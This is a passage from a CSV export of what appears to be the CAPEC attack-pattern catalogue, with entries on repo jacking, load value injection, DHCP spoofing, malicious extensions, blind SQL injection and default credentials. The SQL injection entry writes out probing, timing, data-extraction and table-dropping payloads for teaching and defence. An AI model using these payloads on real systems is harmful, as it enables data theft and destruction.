shell.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::To reduce the amount of information gathered, one could disable various geolocation features of the operating system not required for system operation.::\",\"\",\"::497::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1614:ENTRY NAME:System Language Discovery::\",\"\",\n695,\"Repo Jacking\",Detailed,Stable,\"An adversary takes advantage of the redirect property of directly linked Version Control System (VCS) repositories to trick users into incorporating malicious code into their applications.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:616::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target] The adversary must first identify a target repository that is commonly used and whose owner/maintainer has either changed/deleted their username or transferred ownership of the repository and then deleted their account. The target should typically be a popular and widely used package, as to increase the scope of the attack.::STEP:2:PHASE:Experiment:DESCRIPTION:[Recreate initial repository path] The adversary re-registers the account that was renamed/deleted by the target repository's owner/maintainer and recreates the target repository with malicious code intended to exploit an application. These steps may need to happen in reverse (i.e., recreate repository and then rename an existing account to the target account) if protections are in place to prevent repository reuse.::STEP:3:PHASE:Exploit:DESCRIPTION:[Exploit victims] The adversary's malicious code is incorporated into applications that directly reference the initial repository, which further allows the adversary to conduct additional attacks.::\",\"::Identification of a popular repository that may be directly referenced in numerous software applications::A repository owner/maintainer who has recently changed their username or deleted their account::\",\"::SKILL:Ability to create an account on a VCS hosting site and recreate an existing directory structure.:LEVEL:Low::SKILL:Ability to create malware that can exploit various software applications.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Alter Execution Logic:TECHNICAL IMPACT:Gain Privileges::\",\"::Leverage dedicated package managers instead of directly linking to VCS repositories.::Utilize version pinning and lock files to prevent use of maliciously modified repositories.::Implement vendoring (i.e., including third-party dependencies locally) and leverage automated testing techniques (e.g., static analysis) to determine if the software behaves maliciously.::Leverage automated tools, such as Checkmarx's ChainJacking tool, to determine susceptibility to Repo Jacking attacks.::\",\"::In May 2022, the CTX Python package and PhPass PHP package were both exploited by the same adversary via Repo Jacking attacks. For the CTX package, the adversary performed an account takeover via a password reset, due to an expired domain-hosting email. The attack on PhPass entailed bypassing GitHub's authentication for retired repositories. In both cases, sensitive data in the form of API keys and passwords, each stored in the form of environment variables, were exfiltrated. [REF-732] [REF-733]::In October 2021, the popular JavaScript library UAParser.js was exploited via the takeover of the author's Node Package Manager (NPM) account. The adversary-provided malware downloaded and executed binaries from a remote server to conduct crypto-mining and to exfiltrate sensitive data on Windows systems. This was a wide-scale attack as the package receives 8 to 9 million downloads per week. [REF-732]::\",\"::494::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::\",\"\",\n696,\"Load Value Injection\",Detailed,Draft,\"An adversary exploits a hardware design flaw in a CPU implementation of transient instruction execution in which a faulting or assisted load instruction transiently forwards adversary-controlled data from microarchitectural buffers. By inducing a page fault or microcode assist during victim execution, an adversary can force legitimate victim execution to operate on the adversary-controlled data which is stored in the microarchitectural buffers. The adversary can then use existing code gadgets and side channel analysis to discover victim secrets that have not yet been flushed from microarchitectural state or hijack the system control flow.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:663::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey target application and relevant OS shared code libraries] Adversary identifies vulnerable transient instruction sets and the code/function calls to trigger them as well as instruction sets or code fragments (gadgets) to perform attack. The adversary looks for code gadgets which will allow them to load an adversary-controlled value into trusted memory. They also look for code gadgets which might operate on this controlled value.:TECHNIQUE:Utilize Disassembler and Debugger tools to examine and trace instruction set execution of source code and shared code libraries on a system.::STEP:2:PHASE:Experiment:DESCRIPTION:[Fill microarchitectural buffer with controlled value] The adversary will utilize the found code gadget from the previous step to load a value into a microarchitectural buffer.:TECHNIQUE:The adversary may choose the controlled value to be memory address of sensitive information that they want the system to access:TECHNIQUE:The adversary may choose the controlled value to be the memory address of other code gadgets that they wish to execute by hijacking the control flow of the system::STEP:3:PHASE:Experiment:DESCRIPTION:[Set up instruction to page fault or microcode assist] The adversary must manipulate the system such that a page fault or microcode assist occurs when a valid instruction is run. If the instruction that fails is near where the adversary-controlled value was loaded, the system may forward this value from the microarchitectural buffer incorrectly.:TECHNIQUE:When targeting Intel SGX enclaves, adversaries that have privileges can manipulate PTEs to provoke page-fault exceptions or microcode assists.:TECHNIQUE:When targeting Intel SGX enclaves, adversaries can indirectly revoke permissions for enclave code through the “mprotect” system call:TECHNIQUE:An adversary can evict selected virtual memory pages using legacy interfaces or by increasing physical memory utilization:TECHNIQUE:When attacking a Windows machine, wait until the OS clears the PTE accessed bit. When the page is next accessed, the CPU will always issue a microcode assist for re-setting this bit::STEP:4:PHASE:Exploit:DESCRIPTION:[Operate on adversary-controlled data] Once the attack has been set up and the page fault or microcode assist occurs, the system operates on the adversary-controlled data.:TECHNIQUE:Influence the system to load sensitive information into microarchitectural state which can be read by the adversary using a code gadget.:TECHNIQUE:Hijack execution by jumping to second stage gadgets found in the address space. By utilizing return-oriented programming, this can chain gadgets together and allow the adversary to execute a sequence of gadgets.::\",\"::The adversary needs at least user execution access to a system and a maliciously crafted program/application/process with unprivileged code to misuse transient instruction set execution of the CPU.::The CPU incorrectly transiently forwards values from microarchitectural buffers after faulting or assisted loads::The adversary needs the ability to induce page faults or microcode assists on the target system.::Code gadgets exist that allow the adversary to hijack transient execution and encode secrets into the microarchitectural state.::\",\"::SKILL:Detailed knowledge on how various CPU architectures and microcode perform transient execution for various low-level assembly language code instructions/operations.:LEVEL:High::SKILL:Detailed knowledge on compiled binaries and operating system shared libraries of instruction sequences, and layout of application and OS/Kernel address spaces for data leakage.:LEVEL:High::SKILL:The ability to provoke faulting or assisted loads in legitimate execution.:LEVEL:High::\",\"\",\"::File Signatures for Malicious Software capable of abusing Transient Instruction Set Execution::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Access Control:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Do not allow the forwarding of data resulting from a faulting or assisted instruction. Some current mitigations claim to zero out the forwarded data, but this mitigation still does not suffice.::Insert explicit “lfence” speculation barriers in software before potentially faulting or assisted loads. This halts transient execution until all previous instructions have been executed and ensures that the architecturally correct value is forwarded.::\",\"\",\"::1342::\",\"\",\"\",\n697,\"DHCP Spoofing\",Standard,Stable,\"An adversary masquerades as a legitimate Dynamic Host Configuration Protocol (DHCP) server by spoofing DHCP traffic, with the goal of redirecting network traffic or denying service to DHCP.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:194::NATURE:CanPrecede:CAPEC ID:158::NATURE:CanPrecede:CAPEC ID:94::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Exsisting DHCP lease] An adversary observes network traffic and waits for an existing DHCP lease to expire on a target machine in the LAN.:TECHNIQUE:Adversary observes LAN traffic for DHCP solicitations::STEP:2:PHASE:Experiment:DESCRIPTION:[Capture the DHCP DISCOVER message] The adversary captures DISCOVER messages and crafts OFFER responses for the identified target MAC address. The success of this attack centers on the capturing of and responding to these DISCOVER messages.:TECHNIQUE:Adversary captures and responds to DHCP DISCOVER messages tailored to the target subnet.::STEP:3:PHASE:Exploit:DESCRIPTION:[Compromise Network Access and Collect Network Activity] An adversary successfully acts as a rogue DHCP server by redirecting legitimate DHCP requests to itself.:TECHNIQUE:Adversary sends repeated DHCP REQUEST messages to quickly lease all the addresses within network's DHCP pool and forcing new DHCP requests to be handled by the rogue DHCP server.::\",\"::The adversary must have access to a machine within the target LAN which can send DHCP offers to the target.::\",\"::SKILL:The adversary must identify potential targets for DHCP Spoofing and craft network configurations to obtain the desired results.:LEVEL:Medium::\",\"::The adversary requires access to a machine within the target LAN on a network which does not secure its DHCP traffic through MAC-Forced Forwarding, port security, etc.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:SCOPE:Access Control:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::\",\"::Design: MAC-Forced Forwarding::Implementation: Port Security and DHCP snooping::Implementation: Network-based Intrusion Detection Systems::\",\"::In early 2019, Microsoft patched a critical vulnerability (CVE-2019-0547) in the Windows DHCP client which allowed remote code execution via crafted DHCP OFFER packets. [REF-739]::\",\"::923::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1557.003:ENTRY NAME:Adversary-in-the-Middle: DHCP Spoofing::\",\"\",\n698,\"Install Malicious Extension\",Detailed,Stable,\"An adversary directly installs or tricks a user into installing a malicious extension into existing trusted software, with the goal of achieving a variety of negative technical impacts.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:542::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target(s)] The adversary must first identify target software that allows for extensions/plugins and which they wish to exploit, such as a web browser or desktop application. To increase the attack space, this will often be popular software with a large user-base.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create malicious extension] Having identified a suitable target, the adversary crafts a malicious extension/plugin that can be installed by the underlying target software. This malware may be targeted to execute on specific operating systems or be operating system agnostic.::STEP:3:PHASE:Exploit:DESCRIPTION:[Install malicious extension] The malicious extension/plugin is installed by the underlying target software and executes the adversary-created malware, resulting in a variety of negative technical impacts.:TECHNIQUE:Adversary-Installed: Having already compromised the target system, the adversary simply installs the malicious extension/plugin themself.:TECHNIQUE:User-Installed: The adversary tricks the user into installing the malicious extension/plugin, via means such as social engineering, or may upload the malware on a reputable extension/plugin hosting site and wait for unknowing victims to install the malicious component.::\",\"::The adversary must craft malware based on the type of software and system(s) they intend to exploit.::If the adversary intends to install the malicious extension themself, they must first compromise the target machine via some other means.::\",\"::SKILL:Ability to create malicious extensions that can exploit specific software applications and systems.:LEVEL:Medium::SKILL:Optional: Ability to exploit target system(s) via other means in order to gain entry.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:SCOPE:Access Control:TECHNICAL IMPACT:Modify Data::SCOPE:Authorization:SCOPE:Access Control:TECHNICAL IMPACT:Execute Unauthorized Commands:TECHNICAL IMPACT:Alter Execution Logic:TECHNICAL IMPACT:Gain Privileges::\",\"::Only install extensions/plugins from official/verifiable sources.::Confirm extensions/plugins are legitimate and not malware masquerading as a legitimate extension/plugin.::Ensure the underlying software leveraging the extension/plugin (including operating systems) is up-to-date.::Implement an extension/plugin allow list, based on the given security policy.::If applicable, confirm extensions/plugins are properly signed by the official developers.::For web browsers, close sessions when finished to prevent malicious extensions/plugins from executing the the background.::\",\"::In January 2018, Palo Alto's Unit 42 reported that a malicious Internet Information Services (IIS) extension they named RGDoor was used to create a backdoor into several Middle Eastern government organizations, as well as a financial institution and an educational institution. This malware was used in conjunction with the TwoFace webshell and allowed the adversaries to upload/download files and execute unauthorized commands. [REF-740]::In December 2018, it was reported that North Korea-based APT Kimusky (also known as Velvet Chollima) infected numerous legitimate academic organizations within the U.S., many specializing in biomedical engineering, with a malicious Google Chrome extension. Dubbed Operation STOLEN PENCIL, the attack entailed conducting spear-phishing attacks to trick victims into installing a malicious PDF reader named Auto Font Manager. Once installed, the malware allowed adversaries to steal cookies and site passwords, as well as forward emails from some compromised accounts. [REF-741]::\",\"::507::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1176:ENTRY NAME:Browser Extensions::::TAXONOMY NAME:ATTACK:ENTRY ID:1505.004:ENTRY NAME:Server Software Component: IIS Components::\",\"\",\n699,\"Eavesdropping on a Monitor\",Meta,Draft,\"An Adversary can eavesdrop on the content of an external monitor through the air without modifying any cable or installing software, just capturing this signal emitted by the cable or video port, with this the attacker will be able to impact the confidentiality of the data without being detected by traditional security tools\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:651::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey Target] The adversary surveys the target location, looking for exposed display cables and locations to hide an SDR. This also includes looking for display cables or monitors placed close to a wall, where the SDR can be in range while behind the wall. The adversary also attempts to discover the resolution and refresh rate of the targeted display.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find target using SDR] The adversary sets up an SDR near the target display cable or monitor. They use the SDR software to locate the corresponding frequency of the display cable. This is done by looking for interference peaks that change depending on what the screen is showing. The adversary notes down the possible frequencies of unintentional emission.:TECHNIQUE:An adversary can make use of many different commercially available SDR devices which are easy to setup such as a HackRF, Ubertooth, RTL-SDR, and many others.::STEP:3:PHASE:Exploit:DESCRIPTION:[Visualize Monitor Image] Once the SDR software has been used to identify the target, the adversary will record the transmissions and visualize the monitor image using these transmissions, which allows them to eavesdrop on the information visible on the monitor.:TECHNIQUE:The TempestSDR software can be used in conjunction an SDR device to visualize the monitor image. The adversary will specify the known monitor resolution and refresh rate, or if those are not known they can use the provided auto-correlation graphs to help predict these values. The adversary will then try the different frequencies recorded from the experiment phase, looking for a viewing monitor display. Low pass filters and gain can be manipulated to make the display image clearer.::\",\"::Victim should use an external monitor device::Physical access to the target location and devices::\",\"::SKILL:Knowledge of how to use the SDR and related software: With this knowledge, the adversary will find the correct frequency where the signal is being leaked:LEVEL:Medium::SKILL:Understanding of computing hardware, to identify the video cable and video ports:LEVEL:Low::\",\"::SDR device set with the correspondent antenna::Computer with SDR Software::\",\"::The target will not observe any indicators of the attack from the computer user’s perspective. The only indication of this attack would be a visible SDR with antenna that can be seen in close proximity to a display cable which is not normally present. This requires that the target is aware of what SDRs look like and can recognize that it may be out of place.::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Enhance: Increase the number of electromagnetic shield layers in the display ports and cables to contain or reduce the intensity of the leaked signal.::Implement: Use a protocol that encrypts the video signal; in case the signal is intercepted the signal is protected by the encryption.::Design: Lock away the video cables, making it difficult for the attacker to access the cables and place the antenna near them (If the distance condition between the antenna and display port/cable is not satisfied, the attack will not be possible).::Implement: Use wireless technologies to connect to external display devices.::\",\"\",\"::1300::\",\"\",\"\",\n7,\"Blind SQL Injection\",Detailed,Draft,\"Blind SQL Injection results from an insufficient mitigation for SQL Injection. Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages. Without the error messages that facilitate SQL Injection, the adversary constructs input strings that probe the target through simple Boolean SQL expressions. The adversary can determine if the syntax and structure of the injection was successful based on whether the query was executed or not. Applied iteratively, the adversary determines how and where the target is vulnerable to SQL Injection.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:66::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Hypothesize SQL queries in application]Generated hypotheses regarding the SQL queries in an application. For example, the adversary may hypothesize that their input is passed directly into a query that looks like: SELECT * FROM orders WHERE ordernum = _____orSELECT * FROM orders WHERE ordernum IN (_____)orSELECT * FROM orders WHERE ordernum in (_____) ORDER BY _____ Of course, there are many other possibilities.:TECHNIQUE:Research types of SQL queries and determine which ones could be used at various places in an application.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine how to inject information into the queries]Determine how to inject information into the queries from the previous step such that the injection does not impact their logic. For example, the following are possible injections for those queries: 5' OR 1=1; --and5) OR 1=1; --andordernum DESC; --:TECHNIQUE:Add clauses to the SQL queries such that the query logic does not change.:TECHNIQUE:Add delays to the SQL queries in case server does not provide clear error messages (e.g. WAITFOR DELAY '0:0:10' in SQL Server or BENCHMARK(1000000000,MD5(1) in MySQL). If these can be injected into the queries, then the length of time that the server takes to respond reveals whether the query is injectable or not.::STEP:3:PHASE:Experiment:DESCRIPTION:[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the adversary suspects is vulnerable to SQL injection, attempt to inject the values determined in the previous step. If an error does not occur, then the adversary knows that the SQL injection was successful.:TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters.:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.:TECHNIQUE:Use network-level packet injection tools such as netcat to inject input:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:4:PHASE:Experiment:DESCRIPTION:[Determine database type] Determines the type of the database, such as MS SQL Server or Oracle or MySQL, using logical conditions as part of the injected queries:TECHNIQUE:Try injecting a string containing char(0x31)=char(0x31) (this evaluates to 1=1 in SQL Server only):TECHNIQUE:Try injecting a string containing 0x313D31 (this evaluates to 1=1 in MySQL only):TECHNIQUE:Inject other database-specific commands into input fields susceptible to SQL Injection. The adversary can determine the type of database that is running by checking whether the query executed successfully or not (i.e. whether the adversary received a normal response from the server or not).::STEP:5:PHASE:Exploit:DESCRIPTION:[Extract information about database schema] Extract information about database schema by getting the database to answer yes/no questions about the schema.:TECHNIQUE:Automatically extract database schema using a tool such as Absinthe.:TECHNIQUE:Manually perform the blind SQL Injection to extract desired information about the database schema.::STEP:6:PHASE:Exploit:DESCRIPTION:[Exploit SQL Injection vulnerability] Use the information obtained in the previous steps to successfully inject the database in order to bypass checks or modify, add, retrieve or delete data from the database:TECHNIQUE:Use information about how to inject commands into SQL queries as well as information about the database schema to execute attacks such as dropping tables, inserting records, etc.::\",\"::SQL queries used by the application to store, retrieve or modify data.::User-controllable input that is not properly validated by the application as part of SQL queries.::\",\"::SKILL:Determining the database type and version, as well as the right number and type of parameters to the query being injected in the absence of error messages requires greater skill than reverse-engineering database error messages.:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"::The only indicators of successful Blind SQL Injection are the application or database logs that show similar queries with slightly differing logical conditions that increase in complexity over time. However, this requires extensive logging as well as knowledge of the queries that can be used to perform such injection and return meaningful information from the database.::\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Security by Obscurity is not a solution to preventing SQL Injection. Rather than suppress error messages and exceptions, the application must handle them gracefully, returning either a custom error page or redirecting the user to a default page, without revealing any information about the database or the application internals.::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.::\",\"::An adversary may try entering something like username' AND 1=1; -- in an input field. If the result is the same as when the adversary entered username in the field, then the adversary knows that the application is vulnerable to SQL Injection. The adversary can then ask yes/no questions from the database server to extract information from it. For example, the adversary can extract table names from a database using the following types of queries: username' AND ascii(lower(substring((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 108. If the above query executes properly, then the adversary knows that the first character in a table name in the database is a letter between m and z. If it doesn't, then the adversary knows that the character must be between a and l (assuming of course that table names only contain alphabetic characters). By performing a binary search on all character positions, the adversary can determine all table names in the database. Subsequently, the adversary may execute an actual attack and send something like: username'; DROP TABLE trades; --::In the PHP application TimeSheet 1.1, an adversary can successfully retrieve username and password hashes from the database using Blind SQL Injection. If the adversary is aware of the local path structure, the adversary can also remotely execute arbitrary code and write the output of the injected queries to the local path. Blind SQL Injection is possible since the application does not properly sanitize the $_POST['username'] variable in the login.php file. See also: CVE-2006-4705::\",\"::89::209::74::20::697::707::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Blind SQL Injection::\",\"\",\n70,\"Try Common or Default Usernames and Passwords\",Detailed,Draft,\"An adversary may try certain common or default usernames and passwords to gain access into the system and perform unauthorized actions. An adversary may try an intelligent brute force using empty passwords, known vendor default credentials, as well as a dictionary of common usernames and passwords. Many vendor products come preconfigured with default (and thus well-known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. secret or password) that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"\",\"::The system uses one factor password based authentication.The adversary has the means to interact with the system.::\",\"::SKILL:An adversary just needs to gain access to common default usernames/passwords specific to the technologies used by the system. Additionally, a brute force attack leveraging common passwords can be easily realized if the user name is known.:LEVEL:Low::\",\"::Technology or vendor specific list of default usernames and passwords.::\",\"::Many incorrect login attempts are detected by the system.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Delete all default account credentials that may be put in by the product vendor.::Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.::Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.::Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.::\",\"::A user sets their password to 123 or intentionally leaves their password blank. If the system does not have password strength enforcement against a sound password policy, this password may be admitted. Passwords like these two examples are two simple and common passwords that are easily able to be guessed by the adversary.::Cisco 2700 Series Wireless Location Appliances (version 2.1.34.0 and earlier) have a default administrator username root with a password password. This allows remote attackers to easily obtain administrative privileges. See also: CVE-2006-5288::In April 2019, adversaries attacked several popular IoT devices (a VOIP phone, an office printer, and a video decoder) across multiple customer locations. An investigation conducted by the Microsoft Security Resposne Center (MSRC) discovered that these devices were used to gain initial access to corporate networks. In two of the cases, the passwords for the devices were deployed without changing the default manufacturer’s passwords and in the third instance the latest security update had not been applied to the device. [REF-572]::\",\"::521::262::263::798::654::308::309::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1078.001:ENTRY NAME:Valid Accounts:Default Accounts::\",\"\",\n700,\"Network Boundary Bridging\",Standard,Draft,\"An adversary which has gained elevated access to network boundary devices may use these devices to create a channel to bridge trusted and untrusted networks. Boundary devices do not necessarily have to be on the network’s edge, but rather must serve to segment portions of the target network the adversary wishes to cross into.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:161::NATURE:CanFollow:CAPEC ID:70::NATURE:CanFollow:CAPEC ID:560::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify potential targets] An adversary identifies network boundary devices that can be compromised.:TECHNIQUE:The adversary traces network traffic to identify which devices the traffic flows through. Additionally, the adversary can identify devices using fingerprinting methods or locating the management page to determine identifying information about the device.::STEP:2:PHASE:Experiment:DESCRIPTION:[Compromise targets] The adversary must compromise the identified targets in the previous step.:TECHNIQUE:Once the device is identified, the adversary can attempt to input known default credentials for the device to gain access to the management console.:TECHNIQUE:Adversaries with sufficient identifying knowledge about the target device can exploit known vulnerabilities in network devices to obtain administrative access.::STEP:3:PHASE:Exploit:DESCRIPTION:[Bridge Networks] The adversary changes the configuration of the compromised network device to connect the networks the device was segmenting. Depending on the type of network boundary device and its capabilities, bridging can be implemented using various methods.:TECHNIQUE:The adversary can abuse Network Address Translation (NAT) in firewalls and routers to manipulate traffic flow to their own design. With control of the network device, the adversary can manipulate NAT by either using existing configurations or creating their own to allow two previously unconnected networks to communicate.:TECHNIQUE:Some network devices can be configured to become a proxy server. Adversaries can set up or exploit an existing proxy server on compromised network devices to create a bridge between separate networks.::\",\"::The adversary must have control of a network boundary device.::\",\"::SKILL:The adversary must understand how to manage the target network device to create or edit policies which will bridge networks.:LEVEL:Medium::\",\"::The adversary requires either high privileges or full control of a boundary device on a target network.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Integrity:SCOPE:Authorization:TECHNICAL IMPACT:Alter Execution Logic:TECHNICAL IMPACT:Hide Activities::\",\"::Design: Ensure network devices are storing credentials in encrypted stores::Design: Follow the principle of least privilege and restrict administrative duties to as few accounts as possible. Ensure these privileged accounts are secured with strong credentials which do not overlap with other network devices.::Configuration: When possible, configure network boundary devices to use MFA.::Configuration: Change the default configuration for network devices to harden their security profiles. Default configurations are often enabled with insecure features to allow ease of installation and management. However, these configurations can be easily discovered and exploited by adversaries.::Implementation: Perform integrity checks on audit logs for network device management and review them to identify abnormalities in configurations.::Implementation: Prevent network boundary devices from being physically accessed by unauthorized personnel to prevent tampering.::\",\"::In November 2016, a Smart Install Exploitation Tool was released online which takes advantage of Cisco’s unauthenticated SMI management protocol to download a target’s current configuration files. Adversaries can use this tool to overwrite files to modify the device configurations, or upload maliciously modified OS or firmware to enable persistence. Once the adversary has access to the device’s configurations, they could modify it to redirect network traffic through other network infrastructure.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1599:ENTRY NAME:Network Boundary Bridging::\",\"\",\n701,\"Browser in the Middle (BiTM)\",Standard,Draft,\"An adversary exploits the inherent functionalities of a web browser, in order to establish an unnoticed remote desktop connection in the victim's browser to the adversary's system. The adversary must deploy a web client with a remote desktop session that the victim can access.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:94::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:148::NATURE:CanFollow:CAPEC ID:98::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify potential targets] The adversary identifies an application or service that the target is likely to use.:TECHNIQUE:The adversary stands up a server to host the transparent browser and entices victims to use it by using a domain name similar to the legitimate application. In addition to the transparent browser, the adversary could also install a web proxy, sniffer, keylogger, and other tools to assist in their goals.::STEP:2:PHASE:Experiment:DESCRIPTION:[Lure victims] The adversary crafts a phishing campaign to lure unsuspecting victims into using the transparent browser.:TECHNIQUE:An adversary can create a convincing email with a link to download the web client and interact with the transparent browser.::STEP:3:PHASE:Exploit:DESCRIPTION:[Monitor and Manipulate Data] When the victim establishes the connection to the transparent browser, the adversary can view victim activity and make alterations to what the victim sees when browsing the web.:TECHNIQUE:Once a victim has established a connection to the transparent browser, the adversary can use installed tools such as a web proxy, keylogger, or additional malicious browser extensions to gather and manipulate data or impersonate the victim.::\",\"::The adversary must create a convincing web client to establish the connection. The victim then needs to be lured onto the adversary's webpage. In addition, the victim's machine must not use local authentication APIs, a hardware token, or a Trusted Platform Module (TPM) to authenticate.::\",\"::SKILL::LEVEL:Medium::\",\"::A web application with a client is needed to enable the victim's browser to establish a remote desktop connection to the system of the adversary.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges:LIKELIHOOD:High::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data:LIKELIHOOD:High::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data:LIKELIHOOD:Medium::\",\"::Implementation: Use strong, mutual authentication to fully authenticate with both ends of any communications channel::\",\"\",\"::294::345::\",\"\",\"\",\n702,\"Exploiting Incorrect Chaining or Granularity of Hardware Debug Components\",Detailed,Draft,\"An adversary exploits incorrect chaining or granularity of hardware debug components in order to gain unauthorized access to debug functionality on a chip. This happens when authorization is not checked on a per function basis and is assumed for a chain or group of debug functionality.\",\"\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:180::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find and scan debug interface] The adversary must first find and scan a debug interface to determine what they are authorized to use and what devices are chained to that interface.:TECHNIQUE:Use a JTAGulator on a JTAG interface to determine the correct pin configuration, baud rate, and number of devices in the chain::STEP:2:PHASE:Experiment:DESCRIPTION:[Connect to debug interface] The adversary next connects a device to the JTAG interface using the properties found in the explore phase so that they can send commands. The adversary sends some test commands to make sure the connection is working.:TECHNIQUE:Connect a device such as a BusPirate or UM232H to the JTAG interface and connect using pin layout found from the JTAGulator::STEP:3:PHASE:Exploit:DESCRIPTION:[Move along debug chain] Once the adversary has connected to the main TAP, or JTAG interface, they will move along the TAP chain to see what debug interfaces might be available on that chain.:TECHNIQUE:Run a command such as “scan_chain” to see what TAPs are available in the chain.::\",\"::Hardware device has an exposed debug interface::\",\"::SKILL:Ability to identify physical debug interfaces on a device:LEVEL:Medium::SKILL:Ability to operate devices to scan and connect to an exposed debug interface:LEVEL:Medium::\",\"::A device to scan a TAP or JTAG interface, such as a JTAGulator::A device to communicate on a TAP or JTAG interface, such as a BusPirate::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Implement: Ensure that debug components are properly chained, and their granularity is maintained at different authorization levels::Perform Post-silicon validation tests at various authorization levels to ensure that debug components are only accessible to authorized users::\",\"::A System-on-Chip (SoC) might give regular users access to the SoC-level TAP, but does not want to give access to all of the internal TAPs (e.g., Core). If any of the internal TAPs were incorrectly chained to the SoC-level TAP, this would grant regular users access to the internal TAPs and allow them to execute commands there.::Suppose there is a hierarchy of TAPs (TAP_A is connected to TAP_B and TAP_C, then TAP_B is connected to TAP_D and TAP_E, then TAP_C is connected to TAP_F and TAP_G, etc.). Architecture mandates that the user have one set of credentials for just accessing TAP_A, another set of credentials for accessing TAP_B and TAP_C, etc. However, if, during implementation, the designer mistakenly implements a daisy-chained TAP where all the TAPs are connected in a single TAP chain without the hierarchical structure, the correct granularity of debug components is not implemented, and the attacker can gain unauthorized access.::\",\"::1296::\",\"\",\"\",\n71,\"Using Unicode Encoding to Bypass Validation Logic\",Detailed,Draft,\"An attacker may provide a Unicode string to a system component that is not Unicode aware and use that to circumvent the filter 